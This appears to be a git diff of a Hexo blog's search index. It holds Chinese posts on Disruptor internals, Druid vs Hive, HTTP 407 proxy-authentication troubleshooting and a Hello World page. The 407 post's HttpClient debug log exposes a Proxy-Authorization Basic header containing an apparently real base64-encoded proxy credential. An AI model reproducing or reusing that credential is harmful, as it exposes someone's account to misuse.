class="comment">// 获取最小的消费者序列</span></span><br><span class="line">      <span class="keyword">long</span> gatingSequence = Util.getMinimumSequence(gatingSequences, current);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (wrapPoint &gt; gatingSequence)</span><br><span class="line">      &#123;</span><br><span class="line">        LockSupport.parkNanos(<span class="number">1</span>); <span class="comment">// TODO, should we spin based on the wait strategy?</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">			<span class="comment">// 更新缓存</span></span><br><span class="line">      gatingSequenceCache.set(gatingSequence);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (cursor.compareAndSet(current, next))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-2-2-写入数据"><a href="#4-2-2-写入数据" class="headerlink" title="4.2.2 写入数据"></a>4.2.2 写入数据</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">long</span> sequence)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> (E)entries[(<span class="keyword">int</span>)sequence &amp; indexMask];</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">// dosomething</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="4-2-3发布"><a href="#4-2-3发布" class="headerlink" title="4.2.3发布"></a>4.2.3发布</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">publish</span><span class="params">(<span class="keyword">final</span> <span class="keyword">long</span> sequence)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 将待发布的序列设为可用，这样消费者就可以消费这个序列了</span></span><br><span class="line">  setAvailable(sequence);</span><br><span class="line">  waitStrategy.signalAllWhenBlocking();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-3-消费者端"><a href="#4-3-消费者端" class="headerlink" title="4.3 消费者端"></a>4.3 消费者端</h3><p>Disruptor#start 启动，会在线程池里启动 EventProcessor，每个 EventHandler 对应一个 EventProcessor</p>
+<p>BatchEventProcessor 是 EventProcessor 的实现类，run方法里会轮训，是否有 event 可以被消费，如果可以就调用 EventHandler#onEvent 方法，触发消费者事件。</p>
+<p>重点看 BatchEventProcessor#run 方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 状态设为启动，是一个AtomicBoolean</span></span><br><span class="line">  <span class="keyword">if</span> (!running.compareAndSet(<span class="keyword">false</span>, <span class="keyword">true</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Thread is already running&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 清除中断</span></span><br><span class="line">  sequenceBarrier.clearAlert();</span><br><span class="line">	<span class="comment">// 判断一下消费者是否实现了LifecycleAware ,如果实现了这个接口，那么此时会发送一个启动通知</span></span><br><span class="line">  notifyStart();</span><br><span class="line"></span><br><span class="line">  T event = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">long</span> nextSequence = sequence.get() + <span class="number">1L</span>;</span><br><span class="line">  <span class="keyword">try</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 获取最大可用的序号，表示在之前的都可以安全消费</span></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">long</span> availableSequence = sequenceBarrier.waitFor(nextSequence);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (nextSequence &lt;= availableSequence)</span><br><span class="line">        &#123;</span><br><span class="line">          event = dataProvider.get(nextSequence);</span><br><span class="line">          eventHandler.onEvent(event, nextSequence, nextSequence == availableSequence);</span><br><span class="line">          nextSequence++;</span><br><span class="line">        &#125;</span><br><span class="line">				<span class="comment">// 记录对应消费者消费到哪里</span></span><br><span class="line">        sequence.set(availableSequence);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (<span class="keyword">final</span> TimeoutException e)</span><br><span class="line">      &#123;</span><br><span class="line">        notifyTimeout(sequence.get());</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (<span class="keyword">final</span> AlertException ex)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 如果任务停止，就退出</span></span><br><span class="line">        <span class="keyword">if</span> (!running.get())</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (<span class="keyword">final</span> Throwable ex)</span><br><span class="line">      &#123;</span><br><span class="line">        exceptionHandler.handleEventException(ex, nextSequence, event);</span><br><span class="line">        sequence.set(nextSequence);</span><br><span class="line">        nextSequence++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">finally</span></span><br><span class="line">  &#123;</span><br><span class="line">    notifyShutdown();</span><br><span class="line">    <span class="comment">// 任务关闭</span></span><br><span class="line">    running.set(<span class="keyword">false</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>消费者在消费时候，需要判断其最大可消费的序列号，这个最大可消费序列号是通过 SequenceBarrier#waitFor 方法来实现的</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">waitFor</span><span class="params">(<span class="keyword">final</span> <span class="keyword">long</span> sequence)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> AlertException, InterruptedException, TimeoutException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    		<span class="comment">// 判断是否中断，如果中断就抛出异常，这样上层捕捉，就可以停止 BatchEventProcessor</span></span><br><span class="line">        checkAlert();</span><br><span class="line">				<span class="comment">// 根据不同的策略获取可用的序列</span></span><br><span class="line">        <span class="keyword">long</span> availableSequence = waitStrategy.waitFor(sequence, cursorSequence, dependentSequence, <span class="keyword">this</span>);</span><br><span class="line">				<span class="comment">// 可用序列比申请的序列小，直接返回</span></span><br><span class="line">        <span class="keyword">if</span> (availableSequence &lt; sequence)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> availableSequence;</span><br><span class="line">        &#125;</span><br><span class="line">				<span class="comment">// 如果是单生产者，直接返回 availableSequence；对于多生产者判断是否可用，不可用返回sequence-1</span></span><br><span class="line">        <span class="keyword">return</span> sequencer.getHighestPublishedSequence(sequence, availableSequence);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><p><a href="https://github.com/LMAX-Exchange/disruptor">https://github.com/LMAX-Exchange/disruptor</a></p>
 ]]></content>
       <categories>
-        <category>java进阶</category>
+        <category>java</category>
       </categories>
       <tags>
-        <tag>java</tag>
-        <tag>并发编程</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/hello-world.html</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>druid-vs-hive</title>
-    <url>/druid-vs-hive.html</url>
-    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>druid 用于实时查询，粗粒度的查询。hive 用于离线查询，细粒度的查询，比如查询某个用户的数据</p>
-<h2 id="druid"><a href="#druid" class="headerlink" title="druid"></a>druid</h2><p>Druid 是 MetaMarket 公司研发，专为海量数据集上的做高性能 OLAP (OnLine Analysis Processing)而设计的数据存储和分析系统。主要解决的是对于大量的基于时序的数据进行聚合查询。数据可以实时摄入，进入到 druid 后立即可查。</p>
-<p>Keyword: 分布式、列式存储、实时分析、PB级、聚合查询</p>
-<h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251731981" alt="img"></p>
-<ul>
-<li>realtime 组件负责数据的实时摄入。</li>
-<li>broker 组件负责查询任务的分发以及查询结果的汇总，并将结果返回给用户</li>
-<li>historical 组件负责索引后的历史数据的存储，数据存储在 deep storage。deep storage 可以是本地，也可以是 HDFS 等分布式文件系统</li>
-</ul>
-<h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><p>数据的插入频率非常高，但是更新频率非常低。大部分的查询为聚合查询（aggregation）和报表查询（reporting queries），例如监控系统</p>
-<h2 id="hive"><a href="#hive" class="headerlink" title="hive"></a>hive</h2><p>Hive 由 FaceBook 开发，用于解决海量结构化日志的数据统计。依赖 HDFS 存储数据，依赖 MapReduce 处理数据。Hive 的执行延迟比较高，因此常用于数据分析，对实时性要求不高的场合。架构图如下</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251719767.png" alt="架构"></p>
-<h3 id="使用场景-1"><a href="#使用场景-1" class="headerlink" title="使用场景"></a>使用场景</h3><p>数据汇总：每天/每周用户点击数，流量统计</p>
-<p>非实时分析：日志分析；文本分析</p>
-<p>数据仓库：数据抽取，加载，转换（ETL）</p>
-<p>数据挖掘：用户行为分析；兴趣分区；区域展示</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.slideshare.net/Hadoop_Summit/druid-and-hive-together-use-cases-and-best-practices">https://www.slideshare.net/Hadoop_Summit/druid-and-hive-together-use-cases-and-best-practices</a></p>
-<p><a href="https://cshihong.github.io/2018/05/22/Hive%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/">https://cshihong.github.io/2018/05/22/Hive%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/</a></p>
-<p><a href="https://www.infoq.cn/article/fxl2qxxcq-aex14ee8x5">https://www.infoq.cn/article/fxl2qxxcq-aex14ee8x5</a></p>
-]]></content>
-      <categories>
-        <category>大数据</category>
-      </categories>
-      <tags>
-        <tag>druid</tag>
-        <tag>hive</tag>
-        <tag>大数据</tag>
+        <tag>源码</tag>
+        <tag>disruptor</tag>
       </tags>
   </entry>
   <entry>
@@ -554,6 +504,38 @@
       </tags>
   </entry>
   <entry>
+    <title>druid-vs-hive</title>
+    <url>/druid-vs-hive.html</url>
+    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>druid 用于实时查询，粗粒度的查询。hive 用于离线查询，细粒度的查询，比如查询某个用户的数据</p>
+<h2 id="druid"><a href="#druid" class="headerlink" title="druid"></a>druid</h2><p>Druid 是 MetaMarket 公司研发，专为海量数据集上的做高性能 OLAP (OnLine Analysis Processing)而设计的数据存储和分析系统。主要解决的是对于大量的基于时序的数据进行聚合查询。数据可以实时摄入，进入到 druid 后立即可查。</p>
+<p>Keyword: 分布式、列式存储、实时分析、PB级、聚合查询</p>
+<h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251731981" alt="img"></p>
+<ul>
+<li>realtime 组件负责数据的实时摄入。</li>
+<li>broker 组件负责查询任务的分发以及查询结果的汇总，并将结果返回给用户</li>
+<li>historical 组件负责索引后的历史数据的存储，数据存储在 deep storage。deep storage 可以是本地，也可以是 HDFS 等分布式文件系统</li>
+</ul>
+<h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><p>数据的插入频率非常高，但是更新频率非常低。大部分的查询为聚合查询（aggregation）和报表查询（reporting queries），例如监控系统</p>
+<h2 id="hive"><a href="#hive" class="headerlink" title="hive"></a>hive</h2><p>Hive 由 FaceBook 开发，用于解决海量结构化日志的数据统计。依赖 HDFS 存储数据，依赖 MapReduce 处理数据。Hive 的执行延迟比较高，因此常用于数据分析，对实时性要求不高的场合。架构图如下</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251719767.png" alt="架构"></p>
+<h3 id="使用场景-1"><a href="#使用场景-1" class="headerlink" title="使用场景"></a>使用场景</h3><p>数据汇总：每天/每周用户点击数，流量统计</p>
+<p>非实时分析：日志分析；文本分析</p>
+<p>数据仓库：数据抽取，加载，转换（ETL）</p>
+<p>数据挖掘：用户行为分析；兴趣分区；区域展示</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.slideshare.net/Hadoop_Summit/druid-and-hive-together-use-cases-and-best-practices">https://www.slideshare.net/Hadoop_Summit/druid-and-hive-together-use-cases-and-best-practices</a></p>
+<p><a href="https://cshihong.github.io/2018/05/22/Hive%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/">https://cshihong.github.io/2018/05/22/Hive%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/</a></p>
+<p><a href="https://www.infoq.cn/article/fxl2qxxcq-aex14ee8x5">https://www.infoq.cn/article/fxl2qxxcq-aex14ee8x5</a></p>
+]]></content>
+      <categories>
+        <category>大数据</category>
+      </categories>
+      <tags>
+        <tag>druid</tag>
+        <tag>hive</tag>
+        <tag>大数据</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>hexo deploy 指定 git 账户</title>
     <url>/hexodeploy-edit-gitaccount.html</url>
     <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>hexo deploy默认使用全局的git user.name user.email，通过设置自定义 git 用户</p>
@@ -571,6 +553,49 @@
       <tags>
         <tag>hexo</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Http 407 问题排查</title>
+    <url>/http-407-fix.html</url>
+    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>最近接一个新的代理平台出现了大量 Http 请求 407 的错误，主要是 HttpClient 的“延迟认证”导致的，排查原因记录下</p>
+<h2 id="basic-认证"><a href="#basic-认证" class="headerlink" title="basic 认证"></a>basic 认证</h2><p>实现简单，但如果是 http 请求的话，信息会泄露，存在安全风险</p>
+<p><a href="https://juejin.im/entry/5ac175baf265da239e4e3999">https://juejin.im/entry/5ac175baf265da239e4e3999</a></p>
+<h2 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h2><p>client -&gt; server：未携带认证信息<br>server -&gt; client：返回407<br>client -&gt; server：携带认证信息<br>server -&gt; client：返回200</p>
+<p>注意这两步在代码层面是无感知的，只会收到最后的200。如果这个tcp连接已经建立，下次请求就会直接携带认证信息</p>
+<span id="more"></span>
+
+<p>看看 httpClient 的 debug 日志</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 请求报文</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.002</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &gt;&gt; <span class="string">&quot;GET Http://www.baidu.com/ HTTP/1.1[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.002</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &gt;&gt; <span class="string">&quot;Host: www.baidu.com[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.002</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &gt;&gt; <span class="string">&quot;Proxy-Connection: Keep-Alive[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.002</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &gt;&gt; <span class="string">&quot;User-Agent: Apache-HttpClient/4.5.6 (Java/1.8.0_45)[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.002</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &gt;&gt; <span class="string">&quot;Accept-Encoding: gzip,deflate[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.002</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &gt;&gt; <span class="string">&quot;[\r][\n]&quot;</span></span><br><span class="line"><span class="comment">// 返回报文</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.034</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &lt;&lt; <span class="string">&quot;HTTP/1.1 407 Proxy Authentication Required[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.034</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &lt;&lt; <span class="string">&quot;Mime-Version: 1.0[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.034</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &lt;&lt; <span class="string">&quot;Date: Wed, 31 Jul 2019 02:19:45 GMT[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.034</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &lt;&lt; <span class="string">&quot;Content-Type: text/html;charset=utf-8[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.034</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &lt;&lt; <span class="string">&quot;Content-Length: 80[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.034</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &lt;&lt; <span class="string">&quot;Proxy-Authenticate: Basic realm=&quot;</span>dobel<span class="string">&#x27;s  server&quot;[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.035 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Connection: keep-alive[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.035 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.035 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;407 Authentication Failed!Maybe Proxy-uthentication header is missing or wrong![\n]&quot;</span></span><br><span class="line"><span class="string">// 第二次请求报文</span></span><br><span class="line"><span class="string">10:19:46.060 [main] DEBUG org.apache.http.headers - http-outgoing-0 &gt;&gt; Proxy-Authorization: Basic TVRIVU9DSEU2RUVHOFFMUTEwOnhtS1FHbmJF</span></span><br><span class="line"><span class="string">10:19:46.060 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;GET Http://www.baidu.com/ HTTP/1.1[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.060 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;Host: www.baidu.com[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.061 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;Proxy-Connection: Keep-Alive[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.061 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;User-Agent: Apache-HttpClient/4.5.6 (Java/1.8.0_45)[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.061 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;Accept-Encoding: gzip,deflate[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.061 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;Proxy-Authorization: Basic TVRIVU9DSEU2RUVHOFFMUTEwOnhtS1FHbmJF[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.061 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;[\r][\n]&quot;</span></span><br><span class="line"><span class="string">// 第二次返回报文</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;HTTP/1.1 200 OK[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Cache-Control: private, no-cache, no-store, proxy-revalidate, no-transform[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Content-Encoding: gzip[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Content-Type: text/html[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Date: Wed, 31 Jul 2019 02:19:46 GMT[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Last-Modified: Mon, 23 Jan 2017 13:27:36 GMT[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Pragma: no-cache[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Set-Cookie: BDORZ=27315; max-age=86400; domain=.baidu.com; path=/[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Transfer-Encoding: chunked[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Connection: keep-alive[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;[\r][\n]&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="抢占式认证"><a href="#抢占式认证" class="headerlink" title="抢占式认证"></a>抢占式认证</h2><p>HttpClient 为了安全考虑，默认是不会发送认证信息的，只有在服务端要求情况下，才回去携带。可以通过直接设置 header 来实现抢先式认证。</p>
+<h2 id="请求方-407-原因"><a href="#请求方-407-原因" class="headerlink" title="请求方 407 原因"></a>请求方 407 原因</h2><p>请求方 HttpClient 在 407 时候会再次请求服务端，这两次请求对上层是透明的。按理说请求方是不知道有 407 的错误的。但是如果在超时时间内未完成这两次请求，HttpClient 就会抛出 407。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.baeldung.com/httpclient-4-basic-authentication">https://www.baeldung.com/httpclient-4-basic-authentication</a></p>
+]]></content>
+      <categories>
+        <category>异常排查</category>
+      </categories>
+      <tags>
+        <tag>Http</tag>
+        <tag>HttpClient</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/hello-world.html</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
   </entry>
   <entry>
     <title>java常量池</title>
@@ -622,31 +647,6 @@
       <tags>
         <tag>源码</tag>
         <tag>jvm</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Http 407 问题排查</title>
-    <url>/http-407-fix.html</url>
-    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>最近接一个新的代理平台出现了大量 Http 请求 407 的错误，主要是 HttpClient 的“延迟认证”导致的，排查原因记录下</p>
-<h2 id="basic-认证"><a href="#basic-认证" class="headerlink" title="basic 认证"></a>basic 认证</h2><p>实现简单，但如果是 http 请求的话，信息会泄露，存在安全风险</p>
-<p><a href="https://juejin.im/entry/5ac175baf265da239e4e3999">https://juejin.im/entry/5ac175baf265da239e4e3999</a></p>
-<h2 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h2><p>client -&gt; server：未携带认证信息<br>server -&gt; client：返回407<br>client -&gt; server：携带认证信息<br>server -&gt; client：返回200</p>
-<p>注意这两步在代码层面是无感知的，只会收到最后的200。如果这个tcp连接已经建立，下次请求就会直接携带认证信息</p>
-<span id="more"></span>
-
-<p>看看 httpClient 的 debug 日志</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 请求报文</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.002</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &gt;&gt; <span class="string">&quot;GET Http://www.baidu.com/ HTTP/1.1[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.002</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &gt;&gt; <span class="string">&quot;Host: www.baidu.com[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.002</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &gt;&gt; <span class="string">&quot;Proxy-Connection: Keep-Alive[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.002</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &gt;&gt; <span class="string">&quot;User-Agent: Apache-HttpClient/4.5.6 (Java/1.8.0_45)[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.002</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &gt;&gt; <span class="string">&quot;Accept-Encoding: 